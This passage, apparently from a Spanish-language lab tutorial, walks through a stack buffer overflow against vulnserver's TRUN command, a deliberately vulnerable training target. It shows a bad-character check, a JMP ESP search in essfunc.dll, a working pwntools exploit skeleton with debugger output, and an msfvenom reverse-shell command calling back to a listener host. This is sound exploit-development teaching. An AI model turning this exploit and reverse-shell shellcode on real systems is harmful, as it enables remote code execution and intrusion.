z-hex z-python">\x4e</span><span class="z-constant z-character z-escape z-hex z-python">\x4f</span><span class="z-constant z-character z-escape z-hex z-python">\x50</span><span class="z-constant z-character z-escape z-hex z-python">\x51</span><span class="z-constant z-character z-escape z-hex z-python">\x52</span><span class="z-constant z-character z-escape z-hex z-python">\x53</span><span class="z-constant z-character z-escape z-hex z-python">\x54</span><span class="z-constant z-character z-escape z-hex z-python">\x55</span><span class="z-constant z-character z-escape z-hex z-python">\x56</span><span class="z-constant z-character z-escape z-hex z-python">\x57</span><span class="z-constant z-character z-escape z-hex z-python">\x58</span><span class="z-constant z-character z-escape z-hex z-python">\x59</span><span class="z-constant z-character z-escape z-hex z-python">\x5a</span><span class="z-constant z-character z-escape z-hex z-python">\x5b</span><span class="z-constant z-character z-escape z-hex z-python">\x5c</span><span class="z-constant z-character z-escape z-hex z-python">\x5d</span><span class="z-constant z-character z-escape z-hex z-python">\x5e</span><span class="z-constant z-character z-escape z-hex z-python">\x5f</span><span class="z-constant z-character z-escape z-hex z-python">\x60</span><span class="z-constant z-character z-escape z-hex z-python">\x61</span><span class="z-constant z-character z-escape z-hex z-python">\x62</span><span class="z-constant z-character z-escape z-hex z-python">\x63</span><span class="z-constant z-character z-escape z-hex z-python">\x64</span><span class="z-constant z-character z-escape z-hex z-python">\x65</span><span class="z-constant z-character z-escape z-hex z-python">\x66</span><span class="z-constant z-character z-escape z-hex z-python">\x67</span><span class="z-constant z-character z-escape z-hex z-python">\x68</span><span class="z-constant z-character z-escape z-hex z-python">\x69</span><span class="z-constant z-character z-escape z-hex z-python">\x6a</span><span class="z-constant z-character z-escape z-hex z-python">\x6b</span><span class="z-constant z-character z-escape z-hex z-python">\x6c</span><span class="z-constant z-character z-escape z-hex z-python">\x6d</span><span class="z-constant z-character z-escape z-hex z-python">\x6e</span><span class="z-constant z-character z-escape z-hex z-python">\x6f</span><span class="z-constant z-character z-escape z-hex z-python">\x70</span><span class="z-constant z-character z-escape z-hex z-python">\x71</span><span class="z-constant z-character z-escape z-hex z-python">\x72</span><span class="z-constant z-character z-escape z-hex z-python">\x73</span><span class="z-constant z-character z-escape z-hex z-python">\x74</span><span class="z-constant z-character z-escape z-hex z-python">\x75</span><span class="z-constant z-character z-escape z-hex z-python">\x76</span><span class="z-constant z-character z-escape z-hex z-python">\x77</span><span class="z-constant z-character z-escape z-hex z-python">\x78</span><span class="z-constant z-character z-escape z-hex z-python">\x79</span><span class="z-constant z-character z-escape z-hex z-python">\x7a</span><span class="z-constant z-character z-escape z-hex z-python">\x7b</span><span class="z-constant z-character z-escape z-hex z-python">\x7c</span><span class="z-constant z-character z-escape z-hex z-python">\x7d</span><span class="z-constant z-character z-escape z-hex z-python">\x7e</span><span class="z-constant z-character z-escape z-hex z-python">\x7f</span><span class="z-constant z-character z-escape z-hex z-python">\x80</span><span class="z-constant z-character z-escape z-hex z-python">\x81</span><span class="z-constant z-character z-escape z-hex z-python">\x82</span><span class="z-constant z-character z-escape z-hex z-python">\x83</span><span class="z-constant z-character z-escape z-hex z-python">\x84</span><span class="z-constant z-character z-escape z-hex z-python">\x85</span><span class="z-constant z-character z-escape z-hex z-python">\x86</span><span class="z-constant z-character z-escape z-hex z-python">\x87</span><span class="z-constant z-character z-escape z-hex z-python">\x88</span><span class="z-constant z-character z-escape z-hex z-python">\x89</span><span class="z-constant z-character z-escape z-hex z-python">\x8a</span><span class="z-constant z-character z-escape z-hex z-python">\x8b</span><span class="z-constant z-character z-escape z-hex z-python">\x8c</span><span class="z-constant z-character z-escape z-hex z-python">\x8d</span><span class="z-constant z-character z-escape z-hex z-python">\x8e</span><span class="z-constant z-character z-escape z-hex z-python">\x8f</span><span class="z-constant z-character z-escape z-hex z-python">\x90</span><span class="z-constant z-character z-escape z-hex z-python">\x91</span><span class="z-constant z-character z-escape z-hex z-python">\x92</span><span class="z-constant z-character z-escape z-hex z-python">\x93</span><span class="z-constant z-character z-escape z-hex z-python">\x94</span><span class="z-constant z-character z-escape z-hex z-python">\x95</span><span class="z-constant z-character z-escape z-hex z-python">\x96</span><span class="z-constant z-character z-escape z-hex z-python">\x97</span><span class="z-constant z-character z-escape z-hex z-python">\x98</span><span class="z-constant z-character z-escape z-hex z-python">\x99</span><span class="z-constant z-character z-escape z-hex z-python">\x9a</span><span class="z-constant z-character z-escape z-hex z-python">\x9b</span><span class="z-constant z-character z-escape z-hex z-python">\x9c</span><span class="z-constant z-character z-escape z-hex z-python">\x9d</span><span class="z-constant z-character z-escape z-hex z-python">\x9e</span><span class="z-constant z-character z-escape z-hex z-python">\x9f</span><span class="z-constant z-character z-escape z-hex z-python">\xa0</span><span class="z-constant z-character z-escape z-hex z-python">\xa1</span><span class="z-constant z-character z-escape z-hex z-python">\xa2</span><span class="z-constant z-character z-escape z-hex z-python">\xa3</span><span class="z-constant z-character z-escape z-hex z-python">\xa4</span><span class="z-constant z-character z-escape z-hex z-python">\xa5</span><span class="z-constant z-character z-escape z-hex z-python">\xa6</span><span class="z-constant z-character z-escape z-hex z-python">\xa7</span><span class="z-constant z-character z-escape z-hex z-python">\xa8</span><span class="z-constant z-character z-escape z-hex z-python">\xa9</span><span class="z-constant z-character z-escape z-hex z-python">\xaa</span><span class="z-constant z-character z-escape z-hex z-python">\xab</span><span class="z-constant z-character z-escape z-hex z-python">\xac</span><span class="z-constant z-character z-escape z-hex z-python">\xad</span><span class="z-constant z-character z-escape z-hex z-python">\xae</span><span class="z-constant z-character z-escape z-hex z-python">\xaf</span><span class="z-constant z-character z-escape z-hex z-python">\xb0</span><span class="z-constant z-character z-escape z-hex z-python">\xb1</span><span class="z-constant z-character z-escape z-hex z-python">\xb2</span><span class="z-constant z-character z-escape z-hex z-python">\xb3</span><span class="z-constant z-character z-escape z-hex z-python">\xb4</span><span class="z-constant z-character z-escape z-hex z-python">\xb5</span><span class="z-constant z-character z-escape z-hex z-python">\xb6</span><span class="z-constant z-character z-escape z-hex z-python">\xb7</span><span class="z-constant z-character z-escape z-hex z-python">\xb8</span><span class="z-constant z-character z-escape z-hex z-python">\xb9</span><span class="z-constant z-character z-escape z-hex z-python">\xba</span><span class="z-constant z-character z-escape z-hex z-python">\xbb</span><span class="z-constant z-character z-escape z-hex z-python">\xbc</span><span class="z-constant z-character z-escape z-hex z-python">\xbd</span><span class="z-constant z-character z-escape z-hex z-python">\xbe</span><span class="z-constant z-character z-escape z-hex z-python">\xbf</span><span class="z-constant z-character z-escape z-hex z-python">\xc0</span><span class="z-constant z-character z-escape z-hex z-python">\xc1</span><span class="z-constant z-character z-escape z-hex z-python">\xc2</span><span class="z-constant z-character z-escape z-hex z-python">\xc3</span><span class="z-constant z-character z-escape z-hex z-python">\xc4</span><span class="z-constant z-character z-escape z-hex z-python">\xc5</span><span class="z-constant z-character z-escape z-hex z-python">\xc6</span><span class="z-constant z-character z-escape z-hex z-python">\xc7</span><span class="z-constant z-character z-escape z-hex z-python">\xc8</span><span class="z-constant z-character z-escape z-hex z-python">\xc9</span><span class="z-constant z-character z-escape z-hex z-python">\xca</span><span class="z-constant z-character z-escape z-hex z-python">\xcb</span><span class="z-constant z-character z-escape z-hex z-python">\xcc</span><span class="z-constant z-character z-escape z-hex z-python">\xcd</span><span class="z-constant z-character z-escape z-hex z-python">\xce</span><span class="z-constant z-character z-escape z-hex z-python">\xcf</span><span class="z-constant z-character z-escape z-hex z-python">\xd0</span><span class="z-constant z-character z-escape z-hex z-python">\xd1</span><span class="z-constant z-character z-escape z-hex z-python">\xd2</span><span class="z-constant z-character z-escape z-hex z-python">\xd3</span><span class="z-constant z-character z-escape z-hex z-python">\xd4</span><span class="z-constant z-character z-escape z-hex z-python">\xd5</span><span class="z-constant z-character z-escape z-hex z-python">\xd6</span><span class="z-constant z-character z-escape z-hex z-python">\xd7</span><span class="z-constant z-character z-escape z-hex z-python">\xd8</span><span class="z-constant z-character z-escape z-hex z-python">\xd9</span><span class="z-constant z-character z-escape z-hex z-python">\xda</span><span class="z-constant z-character z-escape z-hex z-python">\xdb</span><span class="z-constant z-character z-escape z-hex z-python">\xdc</span><span class="z-constant z-character z-escape z-hex z-python">\xdd</span><span class="z-constant z-character z-escape z-hex z-python">\xde</span><span class="z-constant z-character z-escape z-hex z-python">\xdf</span><span class="z-constant z-character z-escape z-hex z-python">\xe0</span><span class="z-constant z-character z-escape z-hex z-python">\xe1</span><span class="z-constant z-character z-escape z-hex z-python">\xe2</span><span class="z-constant z-character z-escape z-hex z-python">\xe3</span><span class="z-constant z-character z-escape z-hex z-python">\xe4</span><span class="z-constant z-character z-escape z-hex z-python">\xe5</span><span class="z-constant z-character z-escape z-hex z-python">\xe6</span><span class="z-constant z-character z-escape z-hex z-python">\xe7</span><span class="z-constant z-character z-escape z-hex z-python">\xe8</span><span class="z-constant z-character z-escape z-hex z-python">\xe9</span><span class="z-constant z-character z-escape z-hex z-python">\xea</span><span class="z-constant z-character z-escape z-hex z-python">\xeb</span><span class="z-constant z-character z-escape z-hex z-python">\xec</span><span class="z-constant z-character z-escape z-hex z-python">\xed</span><span class="z-constant z-character z-escape z-hex z-python">\xee</span><span class="z-constant z-character z-escape z-hex z-python">\xef</span><span class="z-constant z-character z-escape z-hex z-python">\xf0</span><span class="z-constant z-character z-escape z-hex z-python">\xf1</span><span class="z-constant z-character z-escape z-hex z-python">\xf2</span><span class="z-constant z-character z-escape z-hex z-python">\xf3</span><span class="z-constant z-character z-escape z-hex z-python">\xf4</span><span class="z-constant z-character z-escape z-hex z-python">\xf5</span><span class="z-constant z-character z-escape z-hex z-python">\xf6</span><span class="z-constant z-character z-escape z-hex z-python">\xf7</span><span class="z-constant z-character z-escape z-hex z-python">\xf8</span><span class="z-constant z-character z-escape z-hex z-python">\xf9</span><span class="z-constant z-character z-escape z-hex z-python">\xfa</span><span class="z-constant z-character z-escape z-hex z-python">\xfb</span><span class="z-constant z-character z-escape z-hex z-python">\xfc</span><span class="z-constant z-character z-escape z-hex z-python">\xfd</span><span class="z-constant z-character z-escape z-hex z-python">\xfe</span><span class="z-constant z-character z-escape z-hex z-python">\xff</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> 0x396f4338 = 2006
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x41</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">2006</span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> junk
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x42</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">4</span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> eip
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">badchars</span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">3000</span> <span class="z-keyword z-operator z-arithmetic z-python">-</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-group z-end z-python">)</span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> filler
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">TRUN .<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></code></pre>
<p>Como se puede observar en el volcado de WinDBG, no tenemos ningún carácter que se interprete de manera errónea.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; db esp l100
</span><span class="z-text z-plain">010cf9c8  01 02 03 04 05 06 07 08-09 0a 0b 0c 0d 0e 0f 10  ................
</span><span class="z-text z-plain">010cf9d8  11 12 13 14 15 16 17 18-19 1a 1b 1c 1d 1e 1f 20  ............... 
</span><span class="z-text z-plain">010cf9e8  21 22 23 24 25 26 27 28-29 2a 2b 2c 2d 2e 2f 30  !&quot;#$%&amp;&#39;()*+,-./0
</span><span class="z-text z-plain">010cf9f8  31 32 33 34 35 36 37 38-39 3a 3b 3c 3d 3e 3f 40  123456789:;&lt;=&gt;?@
</span><span class="z-text z-plain">010cfa08  41 42 43 44 45 46 47 48-49 4a 4b 4c 4d 4e 4f 50  ABCDEFGHIJKLMNOP
</span><span class="z-text z-plain">010cfa18  51 52 53 54 55 56 57 58-59 5a 5b 5c 5d 5e 5f 60  QRSTUVWXYZ[\]^_`
</span><span class="z-text z-plain">010cfa28  61 62 63 64 65 66 67 68-69 6a 6b 6c 6d 6e 6f 70  abcdefghijklmnop
</span><span class="z-text z-plain">010cfa38  71 72 73 74 75 76 77 78-79 7a 7b 7c 7d 7e 7f 80  qrstuvwxyz{|}~..
</span><span class="z-text z-plain">010cfa48  81 82 83 84 85 86 87 88-89 8a 8b 8c 8d 8e 8f 90  ................
</span><span class="z-text z-plain">010cfa58  91 92 93 94 95 96 97 98-99 9a 9b 9c 9d 9e 9f a0  ................
</span><span class="z-text z-plain">010cfa68  a1 a2 a3 a4 a5 a6 a7 a8-a9 aa ab ac ad ae af b0  ................
</span><span class="z-text z-plain">010cfa78  b1 b2 b3 b4 b5 b6 b7 b8-b9 ba bb bc bd be bf c0  ................
</span><span class="z-text z-plain">010cfa88  c1 c2 c3 c4 c5 c6 c7 c8-c9 ca cb cc cd ce cf d0  ................
</span><span class="z-text z-plain">010cfa98  d1 d2 d3 d4 d5 d6 d7 d8-d9 da db dc dd de df e0  ................
</span><span class="z-text z-plain">010cfaa8  e1 e2 e3 e4 e5 e6 e7 e8-e9 ea eb ec ed ee ef f0  ................
</span><span class="z-text z-plain">010cfab8  f1 f2 f3 f4 f5 f6 f7 f8-f9 fa fb fc fd fe ff 01  ................
</span></code></pre>
<h2 id="narly-jmp-esp">Narly &amp; JMP ESP<a class="zola-anchor" href="#narly-jmp-esp" aria-label="Anchor link for: narly-jmp-esp" style="visibility: hidden;"></a>
</h2>
<p>Quedaría comprobar con narly, un script escrito en js para ver cuáles de los módulos que carga la aplicación tiene protecciones y cuáles no, en este caso solo están libres de protecciones la propia aplicación y un dll llamado <code>essfunc.dll</code>, que lo llama la el programa en ejecución.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; !nmod
</span><span class="z-text z-plain">00400000 00407000 vulnserver           /SafeSEH OFF                C:\vulnserver.exe
</span><span class="z-text z-plain">62500000 62508000 essfunc              /SafeSEH OFF                C:\essfunc.dll
</span><span class="z-text z-plain">734a0000 73544000 apphelp              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\apphelp.dll
</span><span class="z-text z-plain">74f10000 74f66000 mswsock              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\mswsock.dll
</span><span class="z-text z-plain">75850000 75a87000 KERNELBASE           /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNELBASE.dll
</span><span class="z-text z-plain">76190000 7624f000 msvcrt               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\msvcrt.dll
</span><span class="z-text z-plain">76330000 76393000 WS2_32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\WS2_32.DLL
</span><span class="z-text z-plain">76400000 764c0000 RPCRT4               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\RPCRT4.dll
</span><span class="z-text z-plain">76520000 765bd000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNEL32.DLL
</span><span class="z-text z-plain">777b0000 7794f000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ntdll.dll
</span></code></pre>
<p>Con <code>-s</code> buscamos el código de operación <code>ff e4</code> que corresponde a jmp esp, se debe indicar el inicio de de la dirección del módulo y el final de la misma, adicionalmente podemos observar que están libres de bytes nulos.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; s -b 62500000 62508000 ff e4
</span><span class="z-text z-plain">625011af  ff e4 ff e0 58 58 c3 5d-c3 55 89 e5 ff e4 ff e1  ....XX.].U......
</span><span class="z-text z-plain">625011bb  ff e4 ff e1 5b 5b c3 5d-c3 55 89 e5 ff e4 ff e3  ....[[.].U......
</span><span class="z-text z-plain">625011c7  ff e4 ff e3 5d 5d c3 5d-c3 55 89 e5 ff e4 ff e7  ....]].].U......
</span><span class="z-text z-plain">625011d3  ff e4 ff e7 5b 5b c3 5d-c3 55 89 e5 ff e4 ff e2  ....[[.].U......
</span><span class="z-text z-plain">625011df  ff e4 ff e2 59 5a c3 5d-c3 55 89 e5 ff e4 ff e6  ....YZ.].U......
</span><span class="z-text z-plain">625011eb  ff e4 ff e6 59 58 c3 5d-c3 55 89 e5 ff e4 ff e5  ....YX.].U......
</span><span class="z-text z-plain">625011f7  ff e4 ff e5 58 5a c3 5d-c3 55 89 e5 ff e4 ff e4  ....XZ.].U......
</span><span class="z-text z-plain">62501203  ff e4 ff e4 ff 64 24 f4-59 59 c3 5d c3 55 89 e5  .....d$.YY.].U..
</span><span class="z-text z-plain">62501205  ff e4 ff 64 24 f4 59 59-c3 5d c3 55 89 e5 81 ec  ...d$.YY.].U....
</span></code></pre>
<p>Escogeremos el segundo, pero ser puede elegir el que se prefiera.</p>
<p>El esqueleto del exploit quedaría de la siguiente forma:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">pwn</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">remote</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">192.168.1.131<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-constant z-numeric z-integer z-decimal z-python">9999</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> 0x396f4338 = 2006
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x41</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-constant z-numeric z-integer z-decimal z-python">2006</span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> junk
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">p32</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-hexadecimal z-python"><span class="z-punctuation z-definition z-numeric z-base z-python">0x</span>625011bb</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> eip -&gt; jmp esp
</span></span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span> <span class="z-keyword z-operator z-assignment z-augmented z-python">+=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-constant z-character z-escape z-hex z-python">\x43</span><span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">*</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span><span class="z-constant z-numeric z-integer z-decimal z-python">3000</span> <span class="z-keyword z-operator z-arithmetic z-python">-</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">len</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-group z-end z-python">)</span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> filler
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-storage z-type z-string z-python">b</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">TRUN .<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">payload</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">buf</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span></code></pre>
<p>En el volcado de WinDBG, podemos ver justo después del salto <code>jmp esp</code>, un salto incondicional, es decir siempre se va a ejecutar, van nuestras <code>\x43</code>, que es donde irá el shellcode.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:003&gt; bp 0x625011bb
</span><span class="z-text z-plain">0:003&gt; g
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=00ecf1e8 ebx=000000d8 ecx=00755370 edx=0000d28e esi=00401848 edi=00401848
</span><span class="z-text z-plain">eip=625011bb esp=00ecf9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">essfunc!EssentialFunc3+0x3:
</span><span class="z-text z-plain">625011bb ffe4            jmp     esp {00ecf9c8}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:003&gt; dd esp
</span><span class="z-text z-plain">00ecf9c8  43434343 43434343 43434343 43434343
</span><span class="z-text z-plain">00ecf9d8  43434343 43434343 43434343 43434343
</span><span class="z-text z-plain">00ecf9e8  43434343 43434343 43434343 43434343
</span><span class="z-text z-plain">00ecf9f8  43434343 43434343 43434343 43434343
</span><span class="z-text z-plain">00ecfa08  43434343 43434343 43434343 43434343
</span><span class="z-text z-plain">00ecfa18  43434343 43434343 43434343 43434343
</span><span class="z-text z-plain">00ecfa28  43434343 43434343 43434343 43434343
</span><span class="z-text z-plain">00ecfa38  43434343 43434343 43434343 43434343
</span></code></pre>
<h2 id="shell-inversa">Shell inversa<a class="zola-anchor" href="#shell-inversa" aria-label="Anchor link for: shell-inversa" style="visibility: hidden;"></a>
</h2>
<p>Quedaría cambiar las <code>\x43</code> por un shellcode real que podríamos generar con msfvenom.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">pwn</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-constant z-language z-import-all z-python">*</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">p</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">remote</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">192.168.1.131<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-constant z-numeric z-integer z-decimal z-python">9999</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.48 LPORT=443 -b &quot;\x00&quot; -f python -v shellcode
